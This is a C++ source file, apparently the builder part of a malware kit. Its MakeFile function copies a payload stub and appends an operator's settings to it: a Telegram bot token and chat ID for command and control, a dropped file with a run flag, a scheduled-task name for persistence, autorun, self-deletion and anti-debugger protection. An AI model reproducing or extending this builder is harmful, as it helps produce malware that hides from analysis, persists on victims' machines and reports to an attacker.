/*
MIT License

Copyright (c) 2020 4B4DB4B3

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include "Builder.h"

BOOL MakeFile(const char* stub, const char* output, Settings* s) {
	std::ifstream f_stub(stub, std::ifstream::binary);
	std::ofstream f_out(output, std::ofstream::binary);

	if (!f_stub.is_open() ||
		!f_out.is_open()) {
		return FALSE;
	}

	f_out << f_stub.rdbuf();
	f_stub.close();

	f_out.write((char*)&s->botapi, sizeof(s->botapi));
	f_out.write((char*)&s->chatid, sizeof(s->chatid));
	f_out.write((char*)&s->drop, sizeof(s->drop));
	f_out.write((char*)&s->drop_run, sizeof(bool));

	f_out.write((char*)&s->scheduler_name, sizeof(s->scheduler_name));
	f_out.write((char*)&s->scheduler_state, sizeof(bool));

	f_out.write((char*)&s->client_delay, sizeof(s->client_delay));
	f_out.write((char*)&s->autorun, sizeof(s->autorun));
	f_out.write((char*)&s->autorun_state, sizeof(bool));

	f_out.write((char*)&s->auto_delete, sizeof(bool));
	f_out.write((char*)&s->protect_debuggers, sizeof(bool));

	f_out.close();

	return TRUE;
}
